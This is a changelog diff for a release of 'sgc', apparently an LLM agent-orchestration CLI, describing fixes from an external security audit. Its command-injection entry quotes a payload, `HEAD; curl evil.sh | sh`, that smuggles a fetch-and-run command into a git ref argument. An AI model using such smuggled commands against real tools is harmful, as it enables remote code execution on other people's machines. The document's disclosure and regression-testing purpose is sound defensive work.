@@ -1,5 +1,244 @@
 # Changelog
 
+## v1.32.0 — 2026-07-15 — audit v1.31.8 remediation: 16 findings across two batches
+
+A full external audit of v1.31.8 (`docs/COMPREHENSIVE-AUDIT-v1.31.8.md` — five
+parallel auditors, every P1 verified by hand) found the orchestration core sound
+and all P0/P1 findings from the two prior audits closed. This release fixes
+everything it did find: 4 P1s and 12 P2s. Remediation queue with per-item
+evidence: `docs/AUDIT-REMEDIATION-ROADMAP-v1.31.8.md`.
+
+Two patterns are worth naming, because both are about *what counts as evidence*
+rather than about any single bug:
+
+**M1 — deterministic guardrails silently degraded to advisory whenever an LLM
+was in the loop.** The classifier's HARD escalation rules lived in code that
+production never called; §8's "out-of-scope access causes immediate termination"
+had no enforcement behind it. Fixing the classifier floor mattered most: the
+level decides whether every *other* gate runs.
+
+**M2 — green signals that were not evidence.** Tests that passed because CI's
+tree happened to be clean, a doctor check that cried STALE at a bun version,
+`npm audit` reporting 0 vulnerabilities while the shipped artifact still carried
+the CVE, a write gate that checked a stamp's shape but not whether it was
+earned, and a reuse metric that counted an LLM quoting its own input.
+
+Test suite 1269 → 1339 (+70, all new regression coverage). `npm audit` 1
+moderate → 0. `sgc doctor` 65 OK / 0 fail. The `node >= 18` claim is now
+verified against a real Node 18 rather than asserted.
+
+### Upgrade notes
+
+- **`sgc reflect` output changed.** `applied` is no longer labelled "L3-validated
+  reuse"; it now says what it counts (a citation in a pre-mortem) and prints a
+  caveat about the circularity. The number itself is unchanged — only the claim
+  about it.
+- **OpenRouter mode now prints a one-time stderr notice** naming what leaves your
+  machine. Suppress by unsetting `OPENROUTER_API_KEY` or setting
+  `SGC_FORCE_INLINE=1`.
+- **`playwright` moved to `optionalDependencies`.** No action needed; a blocked
+  browser CDN no longer fails the whole install. (npm still installs optional
+  deps by default — pass `--omit=optional` to skip.)
+- **Dedup verdicts may differ** on entries whose problem text matches but whose
+  tags diverge: those are now correctly detected as duplicates.
+- **In LLM mode, some tasks will classify higher than before** — that is the
+  point (P1-3). A task the model called L0 that trips a HARD escalation rule now
+  gets the L2/L3 gates it always should have.
+
+### Batch M2 — the twelve P2s
+
+Where M1's P1s shared "deterministic guardrails degrade to advisory under an
+LLM", M2's theme is **green signals that were not evidence**: a test suite that
+passed because CI's tree happened to be dirty in the right way, a doctor check
+that cried STALE at a bun version, `npm audit` reporting clean while the
+shipped artifact still carried the CVE, a §3 write gate that checked a stamp's
+shape but not whether it was earned, and a reuse metric that counted an LLM
+quoting its own input.
+
+### Security
+
+- **P2-10 · The claude-cli prompt no longer rides the command line.**
+  `runClaudeCliAgent` passed the whole prompt — task input YAML, i.e. source
+  and diffs — as an argv element. `/proc/<pid>/cmdline` is world-readable on a
+  default Linux host, so on any shared machine every local user could read the
+  code under review straight out of `ps`, and large prompts sat under ARG_MAX.
+  It now goes over stdin (`SubprocessRunner` gained an optional `stdin` param;
+  existing runners are unaffected). The test that pinned the old behavior
+  (`passes prompt text as argv`) asserted the vulnerability; it now asserts the
+  contract.
+- **P2-11 · OpenRouter egress announces itself.** Setting `OPENROUTER_API_KEY`
+  silently routed every subagent — and every prompt body — through
+  openrouter.ai. The only disclosure was a comment at the top of
+  `openrouter-agent.ts`. sgc now prints a one-time stderr notice naming what
+  leaves and how to stop it, and README documents the data-flow per mode (the
+  dispatch-modes section did not previously mention openrouter at all).
+- **P2-3 · js-yaml 4.1.1 → 4.3.0** (GHSA-h67p-54hq-rp68, quadratic-complexity
+  DoS via merge keys). `npm audit` now reports 0 vulnerabilities. Note for
+  future CVE work on this repo: `npm audit fix` updated the lockfile while
+  `node_modules` kept 4.1.1 on disk, so audit went green while a rebuild would
+  still have inlined the vulnerable code. Verify the *artifact*: the 4.3.0 fix
+  is identifiable by `maxTotalMergeKeys`, which the rebuilt bundle now contains
+  and the v1.31.8 bundle does not.
+
+### Fixed
+
+- **P2-1 · The test suite no longer reads the developer's working tree.**
+  `runShip`'s CE-5 gate fell back to `gitDiffLineCount()`, which shells out to
+  `git diff --numstat HEAD` with no cwd — the *sgc repo itself*, not the test
+  fixture. Three janitor/compound tests therefore passed or failed on whatever
+  the author happened to have unstaged; CI never noticed because a clean
+  checkout produced the value they wanted. They now inject `diffLineCount`.
+- **P2-4 · §13 Tier 2 survives Ctrl+C.** The v1.17.0 signal drain synthesized
+  the missing `spawn.end` but left `llm.request` orphaned — the other half of
+  the dogfood finding it was built from. The agents' own catch cannot cover it:
+  `abort()` rejects asynchronously and `process.exit()` lands before that
+  microtask runs. The drain now closes Tier 2 itself (`registerLlmClose`,
+  mirroring `registerAbort`), emitting `llm.response(outcome="interrupted")`
+  before `spawn.end`, idempotently.
+- **P2-5 · Stale-lock reclaim can no longer delete a live holder's lock.**
+  The reclaim ran `unlinkSync(lockPath)` — a path, not the inode it had judged
+  — so two racers on one crashed-holder remnant could both end up "holding" the
+  lock, and the first's release would strip the second's. For plan-jobs/loop
+  that means duplicate `detached: true` planners: the orphan-process outcome
+  STAB-1 exists to prevent. Reclaim now re-reads and confirms the same bytes
+  before unlinking, and release only unlinks while the lock is still ours
+  (per-acquisition nonce), so a lost lock cannot cascade.
+- **P2-6 · The §3 write gate now verifies the stamp's provenance.**
+  `validateDedupStamp` accepted any non-empty string as
+  `compound_related_spawn_id` while its own error text promised the value "must
+  reference an on-disk spawn". `{compound_related_spawn_id: "x", ...}` passed.
+  The stamp is what makes compound.related's deterministic verdict binding —
+  that agent is kept permanently heuristic precisely so an LLM can't mint
+  `best_similarity: 0` — and a stamp nobody has to earn is decoration on the one
+  gate that isn't allowed to be. It now checks the id parses, names
+  compound.related, and left a result on disk. (Test fixtures that seeded
+  `solutions/` with fabricated stamps now seed the spawn too — a shared
+  `tests/fixtures/related-spawn.ts`. One fixture's id turned out to be
+  malformed by the real spawn-id convention.)
+- **P2-8 · Prior-art recall matches words, not substrings.** The query side
+  tokenized (ICU); the corpus side ran `lower.includes(k)`. The halves
+  disagreed about what a word is, so "auth" hit "author"/"unauthorized" and
+  "cat" hit "category". Every phantom hit raised
+  `relevance_score = hits/keywordCount`, which gates recall (0.3) and surfacing
+  (0.5) — polluting the planner's prior-art context *and* inflating the
+  counters meant to show whether reuse is real. Both sides now tokenize.
+  Word-exact alone would have been a different wrong answer (dropping
+  "table"→"tables"), so a closed list of English inflections is allowed in both
+  directions — the smallest thing that keeps the true positives the substring
+  scan was carrying by accident. (The audit's "ui matches build" example does
+  not actually occur: tokenize's ASCII ≥3 floor drops "ui" from the query.)
+- **P2-9 · The problem signature outweighs tag noise in dedup.** `similarity`
+  averaged tag-jaccard and problem-jaccard equally, so an identical problem with
+  divergent tags scored 0.75 and wrote a duplicate. Tags come from
+  substring-matching a fixed 13-word list — noisy by construction — and were
+  casting half the vote against the entry's actual content. Now weighted
+  0.9/0.1, renormalized over whichever components carry signal (ALG-1's
+  empty-component exclusion is preserved): an identical problem clears the gate
+  whatever the tags say, and identical tags can never carry two unrelated
+  problems over it. The 0.85 threshold is contractual and unchanged.
+
+### Changed
+
+- **P2-2 · Bundle-parity no longer cries STALE at a bun version.** `bun build`
+  output is not byte-stable across versions (measured here: 1.3.5 — CI's pin —
+  reproduces the committed bundle exactly; 1.3.11 does not), so the check failed
+  on any developer machine that isn't CI. Worse than noise: it said "run
+  `npm run build:cli` and commit", and doing so replaces a correct artifact with
+  one CI's own `git diff --exit-code` gate rejects — a false alarm that
+  manufactures a real failure. It now compares the local bun against the pinned
+  one first and, on mismatch, warns and names the version that can actually
+  answer the question. Same bun + hash mismatch still fails.
+- **P2-7 · `applied` is no longer advertised as validated reuse.** The metric is
+  circular by construction: preventions.ts feeds `prior_preventions` into
+  planner.adversarial's prompt, then `extractAppliedSolutionRefs` scans that
+  agent's output for those same refs. `sgc reflect` nonetheless called it
+  "L3-validated reuse (strongest reuse signal)" and ranked it above `surfaced`,
+  which at least rests on an independent keyword match — the label inverted the
+  real ordering and made a prompt-echo look like proof the knowledge engine pays
+  off. The legend now says what is counted (a citation) and prints the
+  circularity next to the number. An honest independent signal would anchor on
+  something the LLM does not author (the shipped diff); that is a data-flow
+  change, left undone rather than faked.
+- **P2-12 · The install-surface promises now have CI behind them.**
+  `engines.node: ">=18"` and the README's npx/global pitch were asserted but
+  only ever run on Node 24, and `tests/e2e/npm-isolated-install.test.sh` existed
+  while wired into nothing. A new `npm-install-node18` job packs the real
+  tarball, installs it into a clean tree, and drives the shipped bundle on
+  Node 18. (Verified locally against a real Node 18.20.8: `--version`, `doctor`
+  33 OK / 0 fail, `metrics` all clean.) `playwright` also moved to
+  `optionalDependencies` to match runtime reality — it is lazily imported behind
+  the opt-in `--browse` flag with a stub fallback, so a blocked browser CDN
+  should not fail `npm i -g @sdsrs/sgc` outright. Note this does not by itself
+  shrink the default install: npm installs optional dependencies unless you pass
+  `--omit=optional`.
+
+### Batch M1 — the four P1s
+
+A full external audit (`docs/COMPREHENSIVE-AUDIT-v1.31.8.md`, 5 parallel
+auditors + per-finding verification) found the orchestration core sound and
+every P0/P1 from the two prior audits closed. Its four P1 findings shared one
+root cause worth naming: **deterministic guardrails silently degraded to
+advisory whenever an LLM was in the loop.** The fixes are small; the pattern is
+the point. Remediation queue: `docs/AUDIT-REMEDIATION-ROADMAP-v1.31.8.md`.
+
+### Fixed
+
+- **P1-1 · `sgc review --base` was a command-injection vector.** `captureDiff`
+  interpolated the operator-supplied ref into an `execSync` shell string — the
+  only shell-string interpolation in the tree — so `--base 'HEAD; curl evil.sh
+  | sh'` executed arbitrary commands. sgc spawns its own subcommands from
+  automation (`plan-jobs.ts`), so an untrusted ref reaching this flag was RCE,
+  not just self-harm. Now goes through a new argv-form `spawnCaptureSync`
+  (`subprocess.ts`), which has no shell to break out of. Regression tests drive
+  `;`, `&&`, `$()`, and backtick payloads and assert the side effect never
+  happens.
+- **P1-3 · The LLM classifier had no deterministic escalation floor.**
+  `classifier.level` has a `prompt_path`, so with an API key present spawn
+  routed to the LLM and `classifierLevelHeuristic` — where the HARD escalation
+  rules live *as code* — never ran. In production those rules existed only as
+  advisory prompt text, and `validateOutputShape` checked the enum, not the
+  floor. Since the level decides whether the planner cluster, the adversarial
+  pre-mortem, and the review + qa gates run at all, one under-classifying
+  verdict disarmed every downstream gate: "run the DB migration to drop the
+  legacy sessions table" classified L0 shipped with no review. `plan.ts` now
+  applies `applyHeuristicFloor` — `max(heuristic, llm)`, LLM may escalate,
+  never downgrade — mirroring the discipline `compound.related` already used to
+  keep an LLM from minting a dedup stamp past the §3 write gate. (Note this
+  also makes v1.31.8's `SECURITY_KEYWORDS` hardening actually reachable in LLM
+  mode; it previously strengthened a function production never called.)
+  `intent.md` now records the *floored* rationale — the frontmatter level was
+  already post-floor, so recording the raw verdict would file an immutable (§2)
+  L3 intent alongside the reasoning for calling it L0.
+
+### Changed
+
+- **P1-2 · Invariant §8 prose now matches what the code enforces.** §8 claimed
+  out-of-scope file/git/spawn access "causes immediate termination … enforcing
+  at the dispatcher closes that path". No such interception exists — and it
+  cannot: an LLM subagent's tool use runs outside sgc's process (`claude -p`, or
+  the provider's side). §8 is now documented as what it actually is — pin the
+  token set, gate the I/O the dispatcher owns, validate + leak-scan what comes
+  back — with the boundary stated as a deliberate one, and a note that the
+  invariants which must not be LLM-bypassable (§3's stamp, the §11 classifier
+  floor) are anchored to deterministic code precisely because §8 cannot carry
+  them. `invariant-enforcement.yaml` §8 `mechanism` matches; the two contract
+  files no longer disagree. No behavior change — this closes an
+  honesty gap, not a hole.
+- **P1-4 · README four-化 scorecard corrected: 自动化 4/6 → 5/9.** The README
+  both stated the wrong number and promised "these numbers are produced by `sgc
+  metrics` … not hand-maintained" while inviting the reader to run it — so the
+  single claim a user could disprove in one command was the false one. (The
+  automation denominator grew when the CE knowledge arc was metered in v1.29+;
+  the prose never followed.) `docs/ROADMAP.md` corrected too.
+
+### Added
+
+- **`sgc doctor` check (M): README scorecard ↔ live metrics parity.** Prose
+  can't be trusted to track code, so P1-4's class of drift is now gated the same
+  way the metrics baseline is (check K). Fails with the exact mismatch.
+- `spawnCaptureSync` (`src/dispatcher/subprocess.ts`) — sync argv capture with
+  the soft-null contract, for call sites that must not build shell strings.
+
 ## v1.31.8 — 2026-06-09 — dogfood hardening: state-root env, classifier security gap, LLM planner resilience, CLI/render fixes
 
 Three more dogfood passes (rounds 11–13) drove the tool through its full
